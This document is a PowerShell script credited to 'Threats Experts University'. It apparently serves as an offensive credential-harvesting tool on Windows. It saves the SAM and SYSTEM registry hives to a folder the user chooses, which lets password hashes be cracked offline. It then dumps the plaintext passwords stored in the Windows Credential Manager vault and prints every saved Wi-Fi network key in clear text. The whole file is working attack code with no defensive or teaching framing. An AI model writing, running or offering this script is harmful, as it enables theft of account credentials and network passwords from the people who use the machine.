# By Threats Experts University

    Write-Host " [*] Admin Session Running ..." -ForegroundColor Green
    Write-Host " [*] Prompting For Extraction Location ..."

    $exportloc = Read-Host -Prompt " [Folder Location]:"
    
        if ($exportloc.EndsWith("\") -eq $false){
        
                $exportloc = $exportloc + "\"
                
                
                }


    $sam = $exportloc + "sam"
    $sysl = $exportloc + "system"

    Write-Host " [*] Extracting SAM ..."
    Start-Sleep -Seconds 2

    reg save hklm\sam $sam

        if ((Test-Path -Path $sam) -eq "true"){
        
            Write-Host " [*] Extraction Of SAM: " -NoNewline ; Write-Host "Successful" -ForegroundColor Green
        
            } else {
            
                Write-Host " [*] Extraction Of SAM: " -NoNewline ; Write-Host "Failed" -ForegroundColor Red
            
                }

    Write-Host " [*] Extracting SYSTEM ..."
    Start-Sleep -Seconds 2

    reg save hklm\system $sysl

            if ((Test-Path -Path $sysl) -eq "true"){
        
            Write-Host " [*] Extraction Of SYSTEM: " -NoNewline ; Write-Host "Successful" -ForegroundColor Green
        
            } else {
            
                Write-Host " [*] Extraction Of SYSTEM: " -NoNewline ; Write-Host "Failed" -ForegroundColor Red
            
                }
    
    
   


    Write-Output ""

    Write-Host " [*] Checking Credential Store ..."
    Start-Sleep -Seconds 2

    Write-Output ""


    [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    $a = @(New-Object Windows.Security.Credentials.PasswordVault)
    $a.RetrieveAll() | % { $_.RetrievePassword();$_ }

    Write-Output ""

    Write-Host " [*] Checking Saved Wireless Passwords ..."
    Start-Sleep -Seconds 2

    Write-Output ""

    $a = netsh wlan show profile | Select-String -Pattern "All User Profile"; $a = $a-replace "All User Profile","" -replace " :",""; $a = $a.trim()
   
    
        Foreach ($i in $a){

        $b = netsh wlan show profile $i key=clear | Select-String -Pattern "Key Content"

        $b = $b -replace "Key Content","" -replace " :",""

            try{
            
            $b = $b.trim()
            
            Write-Host "Network Name: $i | " -NoNewline ; Write-Host " Password: " -NoNewline ; Write-Host $b -ForegroundColor Green
            
            
            } catch { 

                    # Do nothing 

                     }


      }

      Write-Output ""

       
    
    
  